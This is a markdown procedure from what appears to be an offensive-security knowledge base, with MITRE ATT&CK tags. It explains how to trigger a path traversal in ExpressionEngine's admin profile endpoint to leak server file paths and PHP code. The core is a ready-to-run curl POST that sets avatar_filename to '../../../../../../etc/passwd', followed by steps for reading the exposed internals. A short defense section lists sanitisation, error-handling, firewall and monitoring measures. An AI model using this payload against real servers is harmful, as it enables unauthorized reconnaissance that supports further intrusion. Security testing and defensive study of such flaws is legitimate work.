---
id: proc-uuid-placeholder
tags:
  - path-traversal
  - information-disclosure
  - expressionengine
  - php
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-expressionengine-path-traversal]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:06.082Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Trigger-Path-Traversal-in-ExpressionEngine-Profile

## Summary

This procedure exploits a path traversal vulnerability in ExpressionEngine's admin profile settings endpoint by manipulating the avatar_filename parameter, triggering an exception that discloses full server file paths and partial back-end PHP code. It is primarily used for reconnaissance in PHP-based web applications to map server structure.

## Description

In ExpressionEngine, the admin profile edit form at /ee/admin.php?/cp/members/profile/settings&id=1 handles multipart/form-data uploads, including avatar files. By setting avatar_filename to a traversal payload like '../../../../../../etc/passwd', the server attempts to resolve an invalid path during processing, leading to an unhandled exception. The error handler fails to sanitize the path, embedding it in the response along with stack trace details and code snippets. This reveals the absolute server path (e.g., /var/www/html/ee/system/) and fragments of the core file handling logic. While the application is open-source, the path disclosure aids in targeted attacks like LFI or further enumeration. Prerequisites include admin authentication and a valid CSRF token.

## Requirements

1. Authenticated access to ExpressionEngine admin panel (valid session and CSRF token)
2. Knowledge of the target user ID (e.g., &id=1 for primary admin)
3. Tool for sending multipart POST requests (e.g., curl or Burp Suite)
4. Network access to the web server over HTTP/HTTPS

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all file paths in admin endpoints, using basename() or realpath() to prevent traversal
- Implement proper exception handling to avoid leaking paths or code in production (use custom error pages)
- Enable web application firewall (WAF) rules to block traversal patterns like '../' in parameters
- Monitor logs for anomalous POST requests to profile endpoints with suspicious filenames

## Objectives

1. Trigger an exception via path traversal to expose server internals
2. Gather reconnaissance data on file system structure for further exploitation
3. Validate the vulnerability without achieving code execution or data theft

## Instructions

### Step 1: Prepare and Authenticate Session

**Context**: Obtain a valid admin session and CSRF token to access the profile settings form without authentication errors.

Log in to the ExpressionEngine admin panel and navigate to the profile settings. Extract the CSRF token from the form (usually in a hidden input).

### Step 2: Send Crafted POST Request with Payload

**Context**: Inject the path traversal payload into the avatar_filename field to force invalid path resolution during form processing.

**Command** ([[commands/curl-expressionengine-path-traversal]]):
```bash
curl -X POST 'http://target.com/ee/admin.php?/cp/members/profile/settings&id=1' \
  -H 'Content-Type: multipart/form-data' \
  -F 'csrf_token=your_csrf_token' \
  -F 'url=http://example.com' \
  -F 'location=US' \
  -F 'bday=1990-01-01' \
  -F 'bio=Test bio' \
  -F 'language=en' \
  -F 'preferences[]=option1' \
  -F 'avatar_filename=../../../../../../etc/passwd'
```

> This command mimics a legitimate profile edit but sets avatar_filename to traverse to /etc/passwd. Replace placeholders with real values. The server will attempt to handle the file, triggering the exception if traversal is not blocked.

### Step 3: Capture and Analyze Response

**Context**: Review the error output for disclosed information, confirming the vulnerability.

Inspect the HTTP response body for the exception details. Look for lines revealing the full path (e.g., "Failed to open file: /var/www/html/ee/../../../../../../etc/passwd resolved to /etc/passwd") and any PHP code snippets from the stack trace.

**Expected Output**: Error HTML with paths like "/var/www/html/ee/system/ee/ExpressionEngine/Controller/Members/Profile.php" and code fragments showing file operations.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[File and Directory Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-expressionengine-path-traversal]]

## Tools Used

- [[tools/curl]]

## Tags

- path-traversal
- information-disclosure
- expressionengine
